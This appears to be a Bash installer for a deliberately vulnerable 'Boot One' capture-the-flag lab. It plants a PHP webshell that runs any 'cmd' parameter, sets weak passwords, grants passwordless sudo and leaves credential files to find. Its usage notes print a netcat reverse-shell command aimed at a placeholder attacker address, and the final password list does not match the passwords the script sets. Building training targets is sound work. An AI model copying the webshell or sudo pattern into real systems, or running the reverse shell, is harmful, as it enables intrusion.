#!/usr/bin/env bash
# setup_boot_one_lab.sh
# One-click installer for "Boot One" vulnerable lab (safe, local use only)
# Tested on Ubuntu 20.04 / 22.04
set -euo pipefail

LAB_USER_SSH_KEY=""   # optional: paste a public key here to add to user 'one' (leave empty if not needed)
WEB_ROOT="/var/www/html"
PASS_IAMTHEONE="IAMONE"
GPG_FILENAME="credentials.txt.asc"
CREDENTIALS_PLAINTEXT="username:one
password:Clever1#
# sample credential lines -- mimic original walkthrough structure
"

# Ensure running as root
if [ "$(id -u)" -ne 0 ]; then
  echo "ERROR: run this script as root (sudo)." >&2
  exit 2
fi

echo "Updating apt and installing packages..."
apt update -y
DEBIAN_FRONTEND=noninteractive apt install -y apache2 php php-cli gnupg netcat-openbsd wget python3 python3-venv

# Enable and start apache
systemctl enable --now apache2

echo "Creating users and home directories..."
# create users with passwords (you can change these if desired)
useradd -m -s /bin/bash riswan || true
echo "riswan:therealris" | chpasswd

useradd -m -s /bin/bash one || true
echo "one:Clever1#" | chpasswd

useradd -m -s /bin/bash john || true
echo "john:password" | chpasswd

# Optional: add SSH key to 'one' if provided
if [ -n "$LAB_USER_SSH_KEY" ]; then
  mkdir -p /home/one/.ssh
  echo "$LAB_USER_SSH_KEY" > /home/one/.ssh/authorized_keys
  chown -R one:one /home/one/.ssh
  chmod 700 /home/one/.ssh
  chmod 600 /home/one/.ssh/authorized_keys
fi

echo "Creating web pages..."
# Basic site files (home, about, news, contact, login)
cat > "${WEB_ROOT}/index.html" <<'HTML'
<!doctype html><html><head><title>Boot One</title></head><body>
<h1>Boot One</h1>
<nav><a href="/">Home</a> | <a href="/news.html">News</a> | <a href="/about.html">About</a> | <a href="/contact.html">Contact Us</a> | <a href="/login.html">Login</a></nav>
<p>Welcome to the Boot One training server.</p>
</body></html>
HTML

cat > "${WEB_ROOT}/news.html" <<'HTML'
<!doctype html><html><head><title>News</title></head><body><h1>News</h1><p>Nothing special today.</p></body></html>
HTML

cat > "${WEB_ROOT}/about.html" <<'HTML'
<!doctype html><html><head><title>About</title></head><body><h1>About</h1><p>Company internal training materials host.</p></body></html>
HTML

cat > "${WEB_ROOT}/contact.html" <<'HTML'
<!doctype html><html><head><title>Contact Us</title></head><body><h1>Contact Us</h1><p>Email: training@example.local</p></body></html>
HTML

cat > "${WEB_ROOT}/login.html" <<'HTML'
<!doctype html><html><head><title>Login</title></head><body><h1>Login</h1><form method="post"><input name="user"><input type="password" name="pass"><input type="submit"></form></body></html>
HTML

echo "Creating robots.txt including dev_shell.php as disallowed..."
cat > "${WEB_ROOT}/robots.txt" <<'TXT'
User-agent: *
Disallow: /dev_shell.php
Disallow: /passwords.html
Disallow: /secret_admin.php
TXT

echo "Creating passwords.html (empty/decoy) and dev_shell.php (vulnerable webshell)..."
cat > "${WEB_ROOT}/passwords.html" <<'HTML'
<!doctype html><html><head><title>Passwords</title></head><body><h1>Passwords</h1><p>No public passwords here.</p></body></html>
HTML

# Create a deliberately vulnerable PHP webshell: accepts cmd GET parameter and executes it.
# This is intentionally unsafe for lab purposes only.
cat > "${WEB_ROOT}/dev_shell.php" <<'PHP'
<?php
// dev_shell.php - intentionally vulnerable! For lab use only.
if (isset($_GET['cmd'])) {
    // run the user command and show output
    $cmd = $_GET['cmd'];
    // echo a simple delimiter and command
    echo "<pre>Output of: " . htmlspecialchars($cmd) . "\n\n";
    // Execute the command unsafely (vulnerable)
    passthru($cmd . " 2>&1");
    echo "</pre>";
} else {
    echo '<form><input name="cmd"><input type="submit" value="Run"></form>';
}
?>
PHP

# Set web root permissions
chown -R www-data:www-data "${WEB_ROOT}"
chmod -R 755 "${WEB_ROOT}"

echo "Creating file/folder structure under /home/one to match walkthrough..."
ONE_HOME="/home/one"
mkdir -p "${ONE_HOME}/Documents/Hidden/Rabbit/Drinks/Nothing"
mkdir -p "${ONE_HOME}/Documents/Hidden/Rabbit/Food"
chown -R one:one "${ONE_HOME}"
chmod -R 750 "${ONE_HOME}"

# employees.txt (empty/no useful data)
cat > "${ONE_HOME}/Documents/employees.txt" <<'TXT'
# employees - nothing useful here
TXT
chown one:one "${ONE_HOME}/Documents/employees.txt"

# Prepare and place credentials file (we will encrypt with GPG below)
CREDFILE="${ONE_HOME}/Documents/credentials.txt"
echo "${CREDENTIALS_PLAINTEXT}" > "${CREDFILE}"
chown one:one "${CREDFILE}"
chmod 640 "${CREDFILE}"

# Create the data.sh clue file; sentences whose first letters form IAMTHEONE
cat > "${ONE_HOME}/Documents/Hidden/Rabbit/Drinks/Nothing/data.sh" <<'SH'
#!/bin/bash
echo "I always thought mornings helped everyone."
echo "At midnight the server sings quietly."
echo "My keys are hidden in the tea tin."
echo "One note will open the next chest."
echo "Never assume the obvious is the answer."
echo "Everyone forgets to check the initials."
SH
chmod +x "${ONE_HOME}/Documents/Hidden/Rabbit/Drinks/Nothing/data.sh"
chown -R one:one "${ONE_HOME}/Documents/Hidden"

# Create a 'no_food' file as a rabbit hole
echo "You found nothing here. Move along." > "${ONE_HOME}/Documents/Hidden/Rabbit/Food/no_food"
chown one:one "${ONE_HOME}/Documents/Hidden/Rabbit/Food/no_food"

# Create riswan's noob.txt with two passwords inside (as walkthrough)
RISWAN_HOME="/home/riswan"
mkdir -p "${RISWAN_HOME}/"
cat > "${RISWAN_HOME}/noob.txt" <<'TXT'
john:password
one:Clever1#
TXT
chown riswan:riswan "${RISWAN_HOME}/noob.txt"
chmod 640 "${RISWAN_HOME}/noob.txt"

# Create a GPG encrypted file from credentials.txt and store only the .asc in Documents
echo "Encrypting credentials with passphrase..."
# Create a temporary GNUPG home to do symmetric encryption non-interactively
TMPGNUPG="$(mktemp -d)"
export GNUPGHOME="${TMPGNUPG}"
umask 077
# create the file we want to encrypt
gpg --batch --yes --passphrase "${PASS_IAMTHEONE}" -c --pinentry-mode loopback -o "${ONE_HOME}/Documents/${GPG_FILENAME}" "${CREDFILE}"
chown one:one "${ONE_HOME}/Documents/${GPG_FILENAME}"
chmod 640 "${ONE_HOME}/Documents/${GPG_FILENAME}"
# cleanup GNUPG temp
rm -rf "${TMPGNUPG}"
unset GNUPGHOME

echo "Creating the 'Hidden' directories under other users if needed..."
# Optional: mimic other user dirs (john)
mkdir -p /home/john/
echo "nothing here" > /home/john/README.txt
chown -R john:john /home/john

# Place a 'flag.txt' at root for capture
echo "CONGRATULATIONS: you captured the root flag." > /flag.txt
chmod 600 /flag.txt

# Configure sudo: grant user 'one' ALL without password (to mimic walkthrough)
echo "one ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/one_lab && chmod 440 /etc/sudoers.d/one_lab

# Allow www-data to read dev_shell if necessary (already owned by www-data)
# Restart apache to pick up files
systemctl restart apache2

echo "Lab setup complete."
echo "---- QUICK USAGE NOTES ----"
echo "Webshell: http://<target-ip>/dev_shell.php  (use ?cmd=<command> or use the web form)"
echo "Listener example for reverse shell (on your attacker machine): nc -lnvp 4444"
echo "Example webshell reverse command (from webshell input): id | nc -e /bin/bash <attacker-ip> 4444"
echo "GPG Encrypted credentials: /home/one/Documents/${GPG_FILENAME}  (passphrase: ${PASS_IAMTHEONE})"
echo "Clue file: /home/one/Documents/Hidden/Rabbit/Drinks/Nothing/data.sh"
echo "Noob file: /home/riswan/noob.txt"
echo "Sudo privilege: user 'one' can run sudo su (NOPASSWD)"
echo ""
echo "Users/passwords created:"
echo " - riswan : riswan_password"
echo " - one    : one_password"
echo " - john   : john_password"
echo ""
echo "Remember: this machine is intentionally vulnerable. Keep it isolated."
